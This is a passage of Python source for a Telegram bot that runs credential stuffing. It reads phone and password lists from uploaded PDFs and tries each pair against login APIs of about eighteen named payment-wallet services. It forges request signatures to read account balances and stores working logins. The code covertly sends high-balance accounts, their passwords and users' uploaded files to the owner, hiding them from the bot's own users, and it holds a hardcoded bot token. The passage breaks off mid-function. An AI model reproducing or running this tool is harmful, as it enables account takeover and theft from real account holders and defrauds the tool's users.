# ==================== PACKAGE CHECK ====================
REQUIRED_PACKAGES = {
    "telegram": "python-telegram-bot",
    "aiohttp": "aiohttp",
    "PyPDF2": "PyPDF2",
    "reportlab": "reportlab",
}

missing = []
for module, package in REQUIRED_PACKAGES.items():
    try:
        __import__(module)
    except ImportError:
        missing.append(package)

if missing:
    print("=" * 60)
    print("  ❌ MISSING PACKAGES DETECTED!")
    print("=" * 60)
    print("\n  Install these packages first:\n")
    print("  pip install " + " ".join(missing))
    print("\n  OR run:\n")
    print("  pip install -r requirements.txt")
    print("\n" + "=" * 60)
    import sys
    sys.exit(1)

# ==================== IMPORTS ====================
import io
import re
import json
import csv
import sqlite3
import asyncio
import hashlib
import traceback
import os
import random
from datetime import datetime
from pathlib import Path
import urllib.parse
import PyPDF2
import aiohttp
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, PageBreak
from reportlab.lib import colors
from reportlab.lib.units import inch
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8649923751:AAEPwAJR8DGccUyzbHGbOBSwYYpC3PtOYvk"
OWNER_ID = 6857114917

# Database path (same folder as script - works in Termux & everywhere)
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_database.db")

WAITING_FOR_API_SELECTION = 0
WAITING_FOR_CUSTOM_API = 1
WAITING_FOR_PDF = 2
WAITING_FOR_DELAY = 3
WAITING_FOR_ADD_API = 4
WAITING_FOR_EDIT_API_SELECT = 5
WAITING_FOR_EDIT_API_DATA = 6

user_data_store = {}
user_tasks = {}

FIXED_DELAY = 3
# Balance boundary: hits >= this go to PDF 2 (OWNER ONLY)
BALANCE_BOUNDARY = 2000

# ==================== DEFAULT APIs ====================
DEFAULT_APIS = {
    "penguinpay": {
        "name": "PenguinPay",
        "login_url": "https://api.penguinpay-app.com/app/auth/login",
        "wallet_url": "https://api.penguinpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.penguinpay-app.com",
        "referer": "https://app-web.penguinpay-app.com/",
    },
    "showpay": {
        "name": "ShowPay",
        "login_url": "https://api.showpay-web.com/app/auth/login",
        "wallet_url": "https://api.showpay-web.com/app/user/account/wallet",
        "origin": "https://app-web.showpay-web.com",
        "referer": "https://app-web.showpay-web.com/",
    },
    "atg": {
        "name": "ATG",
        "login_url": "https://api.atg-game.com/app/auth/login",
        "wallet_url": "https://api.atg-game.com/app/user/account/wallet",
        "origin": "https://app-web.atg-game.com",
        "referer": "https://app-web.atg-game.com",
    },
    "rs": {
        "name": "RS",
        "login_url": "https://api.rswallet-api.com/app/auth/login",
        "wallet_url": "https://api.rswallet-api.com/app/user/account/wallet",
        "origin": "https://app-web.rswallet-api.com",
        "referer": "https://app-web.rswallet-api.com",
    },
    "swift": {
        "name": "Swift",
        "login_url": "https://api-v2.swiftpay-app.com/app/auth/login",
        "wallet_url": "https://api-v2.swiftpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.swiftpay-app.com",
        "referer": "https://app-web.swiftpay-app.com",
    },
    "miller": {
        "name": "Miller",
        "login_url": "https://api.millerpay-app.com/app/auth/login",
        "wallet_url": "https://api.millerpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.millerpay-app.com",
        "referer": "https://app-web.millerpay-app.com",
    },
    "top": {
        "name": "Top",
        "login_url": "https://api.toppay-web.com/app/auth/login",
        "wallet_url": "https://api.toppay-web.com/app/user/account/wallet",
        "origin": "https://app.toppay-web.com",
        "referer": "https://app.toppay-web.com/",
    },
    "smart": {
        "name": "Smart",
        "login_url": "https://api.smartwallet-app.com/app/auth/login",
        "wallet_url": "https://api.smartwallet-app.com/app/user/account",
        "origin": "https://app-web.smartwallet-app.com",
        "referer": "https://app-web.smartwallet-app.com",
    },
    "east": {
        "name": "East",
        "login_url": "https://api.eastpay-wallet.com/app/auth/login",
        "wallet_url": "https://api.eastpay-wallet.com/app/user/account/wallet",
        "origin": "https://app-web.eastpay-wallet.com",
        "referer": "https://app-web.eastpay-wallet.com",
    },
    "paysetu": {
        "name": "Paysetu",
        "login_url": "https://api.paysetu-app.com/app/auth/login",
        "wallet_url": "https://api.paysetu-app.com/app/user/account/wallet",
        "origin": "https://app-web.paysetu-app.com",
        "referer": "https://app-web.paysetu-app.com/login",
    },
    "autumn": {
        "name": "Autumn",
        "login_url": "https://api.masalape.com/app/auth/login",
        "wallet_url": "https://api.masalape.com/app/user/account/wallet",
        "origin": "https://app-web.autumnpe.com",
        "referer": "https://app-web.autumnpe.com/login?code=farnmoneyn5t",
    },
    "da7": {
        "name": "DA7",
        "login_url": "https://api.da7pay-api.com/app/auth/login",
        "wallet_url": "https://api.da7pay-api.com/app/user/account/wallet",
        "origin": "https://app-web.da7pay.com",
        "referer": "https://app-web.da7pay.com/login",
    },
    "mobius": {
        "name": "Mobius",
        "login_url": "https://api.mobiuspe-app.com/app/auth/login",
        "wallet_url": "https://api.mobiuspe-app.com/app/user/account/wallet",
        "origin": "https://app-web.mobiuspe-app.com",
        "referer": "https://app-web.mobiuspe-app.com/login?code=earnmoney4gb",
    },
    "tata": {
        "name": "Tata",
        "login_url": "https://api.tatapay-web.com/app/auth/login",
        "wallet_url": "https://api.tatapay-web.com/app/user/account/wallet",
        "origin": "https://app-web.tatapay-web.com",
        "referer": "https://app-web.tatapay-web.com/login?code=0dashowpa4ry",
    },
    "o": {
        "name": "O",
        "login_url": "https://api.opay-app.com/app/auth/login",
        "wallet_url": "https://api.opay-app.com/app/user/account/wallet",
        "origin": "https://app-web.opay-app.com",
        "referer": "https://app-web.opay-app.com/login",
    },
    "shark": {
        "name": "Shark",
        "login_url": "https://api.sharkpay-app.com/app/auth/login",
        "wallet_url": "https://api.sharkpay-app.com/app/user/account/wallet",
        "origin": "https://app-web.sharkpay-app.com",
        "referer": "https://app-web.sharkpay-app.com/login",
    },
    "ola": {
        "name": "Ola",
        "login_url": "https://api.app-olapay.com/app/auth/login",
        "wallet_url": "https://api.app-olapay.com/app/user/account/wallet",
        "origin": "https://app-web.app-olapay.com",
        "referer": "https://app-web.app-olapay.com/login",
    },
    "hoyo": {
        "name": "Hoyo",
        "login_url": "https://api.hoyopay-app.com/app/auth/login",
        "wallet_url": "https://api.hoyopay-app.com/app/user/account/wallet",
        "origin": "https://app-web.hoyopay-app.com",
        "referer": "https://app-web.hoyopay-app.com/login",
    },
}

# ==================== DATABASE ====================
def init_database():
    db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_database.db")
    conn = sqlite3.connect(db_path)
    c = conn.cursor()

    # === USERS TABLE ===
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        status TEXT DEFAULT 'pending',
        request_time DATETIME,
        approved_time DATETIME,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS chat_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        message_type TEXT,
        message_content TEXT,
        file_name TEXT,
        api_url TEXT,
        api_name TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS user_pdfs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        file_name TEXT,
        file_path TEXT,
        num_accounts INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    # MIGRATION: Add file_path column if old table exists without it
    try:
        c.execute("SELECT file_path FROM user_pdfs LIMIT 1")
    except sqlite3.OperationalError:
        print("  🔄 Migrating user_pdfs table: adding file_path column...")
        c.execute("ALTER TABLE user_pdfs ADD COLUMN file_path TEXT")
        conn.commit()
        print("  ✅ Migration complete!")



    c.execute("""CREATE TABLE IF NOT EXISTS user_apis (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        api_key TEXT,
        api_name TEXT,
        login_url TEXT,
        wallet_url TEXT,
        origin TEXT,
        referer TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS checkpoints (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        api_key TEXT,
        api_name TEXT,
        last_index INTEGER,
        total INTEGER,
        hits INTEGER,
        status TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        api_key TEXT,
        api_name TEXT,
        phone TEXT,
        password TEXT,
        balance TEXT,
        user_id_val TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    # SPECIAL hits (>= BALANCE_BOUNDARY) — owner only
    c.execute("""CREATE TABLE IF NOT EXISTS high_hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        api_key TEXT,
        api_name TEXT,
        phone TEXT,
        password TEXT,
        balance TEXT,
        user_id_val TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")

    conn.commit()
    conn.close()
    print("Database initialized")

# ==================== USER MANAGEMENT (PUBLIC BOT) ====================
def get_user_status(user_id):
    if user_id == OWNER_ID:
        return "owner"
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else "new"

def ensure_user_recorded(user_id, username, first_name, last_name):
    """Public bot: every user is auto-added to owner's list (no approval needed)"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
        if c.fetchone() is None:
            c.execute("""INSERT INTO users (user_id, username, first_name, last_name, status, request_time, approved_time)
                         VALUES (?,?,?,?,?,?,?)""",
                      (user_id, username, first_name, last_name, "approved", datetime.now(), datetime.now()))
            conn.commit()
            print(f"  ➕ New user recorded: {user_id} (@{username})")
        conn.close()
    except Exception as e:
        print(f"ensure_user_recorded error: {e}")

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""SELECT user_id, username, first_name, last_name, approved_time
                 FROM users ORDER BY approved_time DESC""")
    rows = c.fetchall()
    conn.close()
    return rows

def get_user_stats():
    """All users — public bot, collection info for everyone"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""SELECT u.user_id, u.username, u.first_name,
                 (SELECT COUNT(*) FROM user_pdfs WHERE user_id=u.user_id) as pdf_count,
                 (SELECT COUNT(*) FROM user_apis WHERE user_id=u.user_id) as api_count
                 FROM users u""")
    rows = c.fetchall()
    conn.close()
    return rows

def save_user_pdf(user_id, username, file_name, num_accounts, pdf_bytes):
    """Save PDF to disk and record in DB"""
    try:
        # Create saved_pdfs folder
        save_dir = os.path.join(os.path.dirname(DB_PATH), "saved_pdfs")
        os.makedirs(save_dir, exist_ok=True)

        # Save file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', file_name)
        save_name = f"{user_id}_{timestamp}_{safe_name}"
        file_path = os.path.join(save_dir, save_name)

        with open(file_path, "wb") as f:
            f.write(pdf_bytes)

        # Save to DB
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO user_pdfs (user_id, username, file_name, file_path, num_accounts) VALUES (?,?,?,?,?)",
                  (user_id, username, file_name, file_path, num_accounts))
        conn.commit()
        conn.close()
        return file_path
    except Exception as e:
        print(f"❌ save_user_pdf error: {e}")
        return None

def get_user_pdfs_list(user_id):
    """Get all PDF records for a user"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT file_name, file_path, num_accounts, timestamp FROM user_pdfs WHERE user_id=? ORDER BY timestamp DESC", (user_id,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"DB error (get_user_pdfs_list): {e}")
        return []

def get_user_apis_list(user_id):
    """Get all custom APIs for a user"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT api_key, api_name, login_url, wallet_url, origin, referer, timestamp FROM user_apis WHERE user_id=? ORDER BY timestamp DESC", (user_id,))
        rows = c.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(f"DB error (get_user_apis_list): {e}")
        return []

# ==================== PER-USER APIs ====================
def load_user_apis(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT api_key, api_name, login_url, wallet_url, origin, referer FROM user_apis WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()
    apis = {}
    for row in rows:
        apis[row[0]] = {
            "name": row[1],
            "login_url": row[2],
            "wallet_url": row[3],
            "origin": row[4],
            "referer": row[5],
        }
    return apis

def save_user_api(user_id, api_key, api_data):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM user_apis WHERE user_id=? AND api_key=?", (user_id, api_key))
    c.execute("""INSERT INTO user_apis (user_id, api_key, api_name, login_url, wallet_url, origin, referer)
                 VALUES (?,?,?,?,?,?,?)""",
              (user_id, api_key, api_data["name"], api_data["login_url"], 
               api_data["wallet_url"], api_data["origin"], api_data["referer"]))
    conn.commit()
    conn.close()

def delete_user_api(user_id, api_key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM user_apis WHERE user_id=? AND api_key=?", (user_id, api_key))
    conn.commit()
    conn.close()

def get_user_apis(user_id):
    """Return DEFAULT_APIS + user's custom APIs (private to user)"""
    apis = dict(DEFAULT_APIS)
    custom = load_user_apis(user_id)
    apis.update(custom)
    return apis



# ==================== CHECKPOINTS & HITS ====================
def save_checkpoint(user_id, api_key, api_name, last_index, total, hits, status):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM checkpoints WHERE user_id=? AND api_key=?", (user_id, api_key))
        conn.execute("""INSERT INTO checkpoints (user_id, api_key, api_name, last_index, total, hits, status)
                         VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, last_index, total, hits, status))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Checkpoint save error: {e}")

def save_hit(user_id, api_key, api_name, phone, password, balance, user_id_val):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""INSERT INTO hits (user_id, api_key, api_name, phone, password, balance, user_id_val)
                         VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, phone, password, balance, user_id_val))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Hit save error: {e}")

def get_hits_for_api(user_id, api_key):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT phone, password, balance, user_id_val FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        rows = c.fetchall()
        conn.close()
        return [{"phone": r[0], "password": r[1], "balance": r[2], "user_id": r[3]} for r in rows]
    except:
        return []

def clear_hits(user_id, api_key=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        if api_key:
            conn.execute("DELETE FROM hits WHERE user_id=? AND api_key=?", (user_id, api_key))
            conn.execute("DELETE FROM high_hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        else:
            conn.execute("DELETE FROM hits WHERE user_id=?", (user_id,))
            conn.execute("DELETE FROM high_hits WHERE user_id=?", (user_id,))
        conn.execute("DELETE FROM checkpoints WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Clear hits error: {e}")

def save_high_hit(user_id, api_key, api_name, phone, password, balance, user_id_val):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""INSERT INTO high_hits (user_id, api_key, api_name, phone, password, balance, user_id_val)
                         VALUES (?,?,?,?,?,?,?)""",
                     (user_id, api_key, api_name, phone, password, balance, user_id_val))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"High hit save error: {e}")

def get_high_hits_for_api(user_id, api_key):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT phone, password, balance, user_id_val FROM high_hits WHERE user_id=? AND api_key=?", (user_id, api_key))
        rows = c.fetchall()
        conn.close()
        return [{"phone": r[0], "password": r[1], "balance": r[2], "user_id": r[3]} for r in rows]
    except:
        return []

# ==================== OWNER NOTIFICATIONS ====================
async def notify_owner_pdf(context, user_id, username, first_name, pdf_bytes, file_name, num_accounts):
    try:
        uname = f"@{escape_md(username)}" if username else "No username"
        caption = (f"📄 *User PDF Uploaded*\n\n"
                   f"👤 User: {escape_md(first_name) or ''}\n"
                   f"🔖 {uname}\n"
                   f"🆔 ID: `{user_id}`\n"
                   f"📁 File: `{escape_md(file_name)}`\n"
                   f"🔢 Accounts: {num_accounts}")
        await context.bot.send_document(
            chat_id=OWNER_ID,
            document=io.BytesIO(pdf_bytes),
            filename=file_name,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"PDF forward error: {e}")

async def notify_owner_api(context, user_id, username, first_name, api_data):
    try:
        uname = f"@{escape_md(username)}" if username else "No username"
        text = (f"📡 *New API Added by User*\n\n"
                f"👤 User: {escape_md(first_name) or ''}\n"
                f"🔖 {uname}\n"
                f"🆔 ID: `{user_id}`\n\n"
                f"*API Details:*\n"
                f"📛 Name: {escape_md(api_data['name'])}\n"
                f"🔗 Login: `{escape_md(api_data['login_url'])}`\n"
                f"💳 Wallet: `{escape_md(api_data['wallet_url'])}`\n"
                f"🌐 Origin: `{escape_md(api_data['origin'])}`\n"
                f"📍 Referer: `{escape_md(api_data['referer'])}`")
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add to My Bot", callback_data=f"owner_add_api_{user_id}_{escape_md(api_data['name'])}")]
        ])
        await context.bot.send_message(chat_id=OWNER_ID, text=text, parse_mode="Markdown", reply_markup=keyboard)
    except Exception as e:
        print(f"API notify error: {e}")

# ==================== CHAT HISTORY ====================
def save_chat_history(user_id, username, first_name, last_name, message_type, message_content="", file_name="", api_url="", api_name=""):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""INSERT INTO chat_history 
            (user_id,username,first_name,last_name,message_type,message_content,file_name,api_url,api_name)
            VALUES (?,?,?,?,?,?,?,?,?)""", 
            (user_id, username, first_name, last_name, message_type, message_content, file_name, api_url, api_name))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB error: {e}")

# ==================== HELPERS ====================
def clean_string(text):
    if not text:
        return text
    text = str(text).strip()
    if text.startswith("'"):
        text = text[1:]
    if text.endswith("'"):
        text = text[:-1]
    return text.strip()

def clean_phone(phone_str):
    phone_str = clean_string(phone_str)
    digits = re.sub(r"\D", "", str(phone_str))
    if len(digits) == 12 and digits.startswith("91"):
        return digits[2:]
    if len(digits) == 10:
        return digits
    if len(digits) > 10:
        return digits[-10:]
    return None

def clean_password(password_str):
    return clean_string(password_str)
# ==================== MARKDOWN ESCAPE ====================
def escape_md(text):
    """Escape markdown special chars for Telegram parse_mode='Markdown'"""
    if not text:
        return ""
    text = str(text)
    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
        text = text.replace(ch, '\\' + ch)
    return text


def extract_credentials_from_pdf(pdf_bytes):
    credentials = []
    current_phone = None
    current_password = None
    pdf_file = io.BytesIO(pdf_bytes)
    reader = PyPDF2.PdfReader(pdf_file)
    for page in reader.pages:
        text = page.extract_text()
        if not text:
            continue
        for line in text.split("\n"):
            line = clean_string(line.strip())
            if not line:
                continue
            numbers = re.findall(r"\b\d{10}\b", line)
            if numbers:
                for num in numbers:
                    cleaned = clean_phone(num)
                    if cleaned:
                        if current_phone and current_password:
                            credentials.append({"phone": current_phone, "password": current_password})
                        current_phone = cleaned
                        current_password = None
                        remaining = re.sub(r"\b\d{10}\b", "", line).strip()
                        if remaining:
                            current_password = clean_password(remaining)
            else:
                cleaned_line = clean_password(line)
                if current_phone and not current_password:
                    current_password = cleaned_line
                elif current_phone and current_password:
                    credentials.append({"phone": current_phone, "password": current_password})
                    current_phone = None
                    current_password = None
        if current_phone and current_password:
            credentials.append({"phone": current_phone, "password": current_password})
            current_phone = None
            current_password = None
    return credentials

# ==================== TOKEN EXTRACTION ====================
def extract_session_key(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("sessionKey"):
            return result["data"]["sessionKey"]
    if result.get("sessionKey"):
        return result.get("sessionKey")
    return None

def extract_login_token(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("loginToken"):
            return result["data"]["loginToken"]
    if result.get("loginToken"):
        return result.get("loginToken")
    return None

def extract_user_id(result):
    if result.get("data") and isinstance(result["data"], dict):
        if result["data"].get("userId"):
            return result["data"]["userId"]
    if result.get("userId"):
        return result.get("userId")
    return None

# ==================== SIGNATURE GENERATION ====================
def generate_signature(data, session_key):
    try:
        if isinstance(data, dict):
            sorted_items = sorted(data.items())
            query_string = "&".join([f"{k}={v}" for k, v in sorted_items])
        else:
            query_string = str(data) if data else ""
        string_to_sign = f"{query_string}&{session_key}"
        return hashlib.md5(string_to_sign.encode()).hexdigest()
    except:
        return None

# ==================== SINGLE API LOGIN + WALLET ====================
async def login_and_check_wallet(session, api_url, wallet_url, phone, password, origin, referer):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json;charset=UTF-8",
        "origin": origin,
        "referer": referer,
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
    }
    request_body = {"phone": phone, "password": password}
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.post(api_url, json=request_body, headers=headers, timeout=timeout) as resp:
            text = await resp.text()
            try:
                result = json.loads(text)
                if resp.status == 200 and result.get("code") == 200:
                    session_key = extract_session_key(result)
                    user_id_val = extract_user_id(result)
                    login_token = extract_login_token(result)
                    if not session_key:
                        session_key = login_token
                    balance = 0
                    if session_key and wallet_url:
                        wallet_data = {"ts": int(datetime.now().timestamp() * 1000)}
                        if user_id_val:
                            wallet_data["userId"] = int(user_id_val) if str(user_id_val).isdigit() else user_id_val
                        signature = generate_signature(wallet_data, session_key)
                        wallet_headers = {
                            "accept": "application/json, text/plain, */*",
                            "content-type": "application/json;charset=UTF-8",
                            "origin": origin,
                            "referer": referer,
                            "signature": signature,
                            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                        }
                        async with session.post(wallet_url, json=wallet_data, headers=wallet_headers, timeout=timeout) as wresp:
                            wtext = await wresp.text()
                            try:
                                wresult = json.loads(wtext)
                                if wresp.status == 200 and wresult.get("code") == 200:
                                    data = wresult.get("data", {})
                                    if "xtoken" in data:
                                        balance = float(data["xtoken"])
                            except:
                                balance = 0
                    return True, balance, user_id_val
                else:
                    return False, None, None
            except json.JSONDecodeError:
                return False, None, None
    except Exception:
        return False, None, None

# ==================== ALERT ====================
async def send_high_balance_alert(update, context, phone, balance, api_name):
    """Alert to USER — only for PDF 1 credits (balance < BALANCE_BOUNDARY)"""
    try:
        alert_text = "🚨 *HIGH BALANCE ALERT!*\n\n📱 Phone: `" + phone + "`\n💰 Balance: *" + balance + "*\n📡 API: *" + api_name + "*\n⏰ Time: " + datetime.now().strftime("%I:%M:%S %p")
        await update.message.reply_text(alert_text, parse_mode="Markdown")
    except Exception as e:
        print("Alert send error: " + str(e))

async def send_owner_high_alert(context, phone, password, balance, api_name, user_id, username, first_name):
    """Instant alert to OWNER for every hit >= BALANCE_BOUNDARY (PDF 2 credits)"""
    try:
        uname = f"@{escape_md(username)}" if username else "No username"
        owner_text = (
            f"🔥 *HIGH BALANCE HIT (≥ {BALANCE_BOUNDARY})*\n\n"
            f"👤 User: {escape_md(first_name) or ''}\n"
            f"🔖 {uname}\n"
            f"🆔 ID: `{user_id}`\n\n"
            f"📱 Phone: `{phone}`\n"
            f"🔑 Pass: `{escape_md(password)}`\n"
            f"💰 Balance: *{balance}*\n"
            f"📡 API: *{api_name}*\n"
            f"⏰ Time: {datetime.now().strftime('%I:%M:%S %p')}"
        )
        await context.bot.send_message(chat_id=OWNER_ID, text=owner_text, parse_mode="Markdown")
    except Exception as e:
        print(f"Owner high alert error: {e}")

# ==================== INDEPENDENT API RUNNER ====================
async def run_single_api_independently(session, api_key, api_info, credentials, update, context, user_id, apis_dict):
    api_name = api_info["name"]
    successful_accounts = []
    checked = 0
    total = len(credentials)
    cancelled = False
    last_progress_edit = 0
    high_balance_accounts = []  # PDF 2 — owner only

    print("\n🚀 [" + api_name + "] Starting independent check...")

    try:
        for i, cred in enumerate(credentials, 1):
            task = user_tasks.get(user_id)
            if task and task.done():
                print("   [" + api_name + "] Cancelled by user at " + str(i) + "/" + str(total))
                cancelled = True
                break

            phone = cred.get("phone")
            password = cred.get("password")
            if not phone or not password:
                continue

            checked = i

            try:
                success, balance, user_id_val = await login_and_check_wallet(
                    session, api_info["login_url"], api_info["wallet_url"],
                    phone, password, api_info["origin"], api_info["referer"]
                )
            except asyncio.CancelledError:
                print("   [" + api_name + "] Cancelled at " + str(i) + "/" + str(total))
                cancelled = True
                break
            except Exception as e:
                success, balance, user_id_val = False, None, None

            if success:
                bal_str = "{:.2f}".format(balance) if balance is not None else "0.00"
                try:
                    bal_float = float(bal_str)
                except:
                    bal_float = 0

                if bal_float >= BALANCE_BOUNDARY:
                    # ===== PDF 2 CREDIT — OWNER ONLY (user never sees it) =====
                    high_balance_accounts.append({
                        "phone": phone, "password": password,
                        "balance": bal_str, "user_id": user_id_val or "N/A"
                    })
                    save_high_hit(user_id, api_key, api_name, phone, password, bal_str, user_id_val or "N/A")
                    await send_owner_high_alert(context, phone, password, bal_str, api_name,
                                                user_id, update.effective_user.username, update.effective_user.first_name)
                else:
                    # ===== PDF 1 CREDIT — USER =====
                    successful_accounts.append({
                        "phone": phone, "password": password,
                        "balance": bal_str, "user_id": user_id_val or "N/A"
                    })
                    save_hit(user_id, api_key, api_name, phone, password, bal_str, user_id_val or "N/A")
                    if bal_float >= 1000:
                        await send_high_balance_alert(update, context, phone, bal_str, api_name)

            now = datetime.now()
            should_update = (i % 50 == 0) or (i == total)
            time_since_edit = (now - datetime.fromtimestamp(last_progress_edit)).total_seconds() if last_progress_edit else 999
            should_update = should_update or (time_since_edit > 300)

            if should_update:
                print("   [" + api_name + "] Progress: " + str(i) + "/" + str(total) + " | Hits: " + str(len(successful_accounts) + len(high_balance_accounts)))
                try:
                    current_time = now.strftime("%I:%M:%S %p")
                    progress_data = user_data_store.get(user_id, {}).get("api_progress", {})
                    if api_key in progress_data:
                        progress_data[api_key]["done"] = i
                        progress_data[api_key]["hits"] = len(successful_accounts) + len(high_balance_accounts)
                        progress_data[api_key]["status"] = "✅" if i >= total else "⏳"
                        progress_data[api_key]["last_update"] = current_time

                    progress_lines = ["📊 *Overall Progress*\n━━━━━━━━━━━━━━━━━━━━"]
                    for ak, data in progress_data.items():
                        api_n = apis_dict.get(ak, {}).get("name", ak)
                        bar_done = int((data["done"] / data["total"]) * 10) if data["total"] > 0 else 0
                        bar = "█" * bar_done + "░" * (10 - bar_done)
                        last_up = data.get("last_update", "--:--:-- --")
                        progress_lines.append(data["status"] + " " + api_n + " [" + last_up + "]: " + str(data["done"]) + "/" + str(data["total"]) + " " + bar + " 🟢" + str(data["hits"]))

                    progress_text = "\n".join(progress_lines)

                    msg_id = user_data_store.get(user_id, {}).get("progress_msg_id")
                    chat_id = user_data_store.get(user_id, {}).get("progress_chat_id")
                    if msg_id and chat_id:
                        msg_age = (now - datetime.fromtimestamp(last_progress_edit)).total_seconds() if last_progress_edit else 0
                        if msg_age > 1800 and last_progress_edit > 0:
                            new_msg = await context.bot.send_message(
                                chat_id=chat_id, text=progress_text, parse_mode="Markdown"
                            )
                            user_data_store[user_id]["progress_msg_id"] = new_msg.message_id
                            try:
                                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                            except:
                                pass
                        else:
                            await context.bot.edit_message_text(
                                chat_id=chat_id, message_id=msg_id,
                                text=progress_text, parse_mode="Markdown"
                            )
                        last_progress_edit = now.timestamp()
                except Exception as e:
                    print("   [" + api_name + "] Progress update error: " + str(e))
                    last_progress_edit = 0

            if i < total:
                await asyncio.sleep(FIXED_DELAY)

    except asyncio.CancelledError:
        print("   [" + api_name + "] Task cancelled externally")
        cancelled = True
    except Exception as e:
        print("   [" + api_name + "] CRASHED: " + str(e))
        traceback.print_exc()

    db_hits = get_hits_for_api(user_id, api_key)
    if db_hits:
        existing_phones = {s["phone"] for s in successful_accounts}
        for h in db_hits:
            if h["phone"] not in existing_phones:
                successful_accounts.append(h)

    # Merge saved high hits from DB (crash/stop safety for PDF 2)
    db_high = get_high_hits_for_api(user_id, api_key)
    if db_high:
        existing_high_phones = {s["phone"] for s in high_balance_accounts}
        for h in db_high:
            if h["phone"] not in existing_high_phones:
                high_balance_accounts.append(h)

    print("   [" + api_name + "] COMPLETE! Hits: " + str(len(successful_accounts)) + " normal + " + str(len(high_balance_accounts)) + " high /" + str(checked))

    if successful_accounts:
        try:
            stagger_delay = random.uniform(0, 8)
            print("   [" + api_name + "] Waiting " + "{:.1f}".format(stagger_delay) + "s before sending PDF...")
            await asyncio.sleep(stagger_delay)

